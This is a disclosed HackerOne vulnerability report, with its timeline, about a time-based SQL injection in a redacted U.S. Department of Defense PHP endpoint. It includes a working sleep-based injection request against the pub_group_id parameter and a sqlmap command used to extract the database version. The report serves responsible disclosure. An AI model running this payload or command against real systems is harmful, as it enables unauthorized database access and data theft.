---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/sql-injection
  - env/web
  - stack/php
  - vuln/sql-injection
  - impact/data-exposure
substate: "resolved"
weakness: "SQL Injection"
enriched: true
body: true
date: 2019-10-04
submitted: 2019-02-01T01:28:43.640Z
bounty_usd: null
votes: 6
cve: []
program: "[[programs/deptofdefense|U.S. Dept Of Defense]]"
reporter: "sp1d3rs"
source: "https://hackerone.com/reports/489483"
title: "SQL Injection in the get_publications.php on the https://█████"
---
# SQL Injection in the get_publications.php on the https://█████

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 6 | **Program:** U.S. Dept Of Defense | **Disclosed:** 2019-10-04

- Report: [https://hackerone.com/reports/489483](https://hackerone.com/reports/489483)
- CWE: SQL Injection
- Submitted: 2019-02-01T01:28:43.640Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

##Description
Hello. I was able to find Time-based SQLI on the https://███/pubs/get_publications.php using `pub_group_id` parameter

##POC
```
GET /pubs/get_publications.php?pub_group_id=wrtqvasi10rc19j1'%2b(select*from(select(sleep(5)))a)%2b'&rno86qi4=1 HTTP/1.1
Host: █████
Connection: keep-alive
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Referer: https://█████/pubs/
Accept-Encoding: gzip, deflate, br
Accept-Language: en,ru;q=0.9,en-US;q=0.8,uk;q=0.7
Cookie: _ga=GA1.2.1697249984.1548431559; __utma=161700579.1697249984.1548431559.1548902867.1548902867.1; __utmz=161700579.1548902867.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided); _test_cookie=0


```
This request will trigger the 5 sec delay of the response. By making sleep value as 10, request will be delayed for 10 seconds.
As additional POC, that attacker is able to extract data, and it's not a false-positive, I retrieved DB banner (version) only using sqlmap command:
```
sqlmap.py -r test.txt --dbms=mysql --technique=T -p pub_group_id --banner --force-ssl --level=5
```
where test.txt is a text fiile contained request dump above.
Result:
```
5.5.62-0ubuntu0.14.04.1
```
█████

No sensitive data such as databases, tables, or content was accessed.

## Impact

SQL injection usually have high or critical impact.

## Timeline

- **Report Filed**
- **2019-02-01** @U.S. Dept Of Defense: Greetings from the Department of Defense (DoD),

Thank you for supporting the DoD Vulnerability Disclosure Program (VDP).

By submitting this report, you acknowledge understanding of, and agreement to, the DoD Vulnerability Disclosure Policy as detailed at @DeptofDefense.

The VDP Team will review your report to ensure compliance with the DoD Vulnerability Disclosure Policy.  If your report is determined to be out-of-scope, it will be closed without action.

We will attempt to validate in-scope vulnerability reports and may request additional information from you if necessary. We will forward reports with validated vulnerabilities to DoD system owners for their action.

Our goal is to provide you with status updates not less than every two weeks until the reported vulnerability is resolved.

Regards,

The VDP Team
- **2019-02-01** @sp1d3rs: This is my second SQL injection on this asset (not duplicate), first was in #488795 in other script (library.php)
- **Report Needs More Info**
- **Report New**
- **Report Severity Updated**
- **Report Triaged**
- **2019-02-04** @ag3nt-z3: @sp1d3rs boom that was it. That's my bad, I blindly took your original PoC and put it into a text file and never even looked to see if I needed to remove any sql statements. You rock, keep up the good work!
- **2019-02-04** @sp1d3rs: Thanks @ag3nt-z3 !
- **2019-03-01** @agent-1: @sp1d3rs 

Thanks for all of your great research and submissions during the month of February. We would like to publicly recognize your hard work on our Twitter page @DC3VDP. Would you have any issues with that, and if not, would you like us to use your real name, just your alias, or both?

DC3 VDP Team
- **2019-03-01** @sp1d3rs: Hi @agent-1 , it's awesome news, thanks!
I'm open to the any option, you can tag my Twitter account `https://twitter.com/h1_sp1d3r`, it also contains real name (Evgeniy Yakovchuk).
- **Report Resolved**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
- **Comments Closed**
- **2020-01-16** @agent-1: @sp1d3rs  

After a through review of all researchers we want to congratulate you for being selected as the 2019 VDP Researcher of the Year!! In addition to being highlighted on Twitter we would like to put you in our 2019 Annual Report and also mail you a package of swag. We need two things from you:

1. A headshot photo
2. A mailing address

If you don't feel comfortable with providing the mailing address we can send it to HackerOne and they can coordinate the shipping to you. Please let us know.

DoD VDP Team
- **2020-01-17** @agent-1: @sp1d3rs

You can also send us this information via email to VDP-Questions@dc3.mil
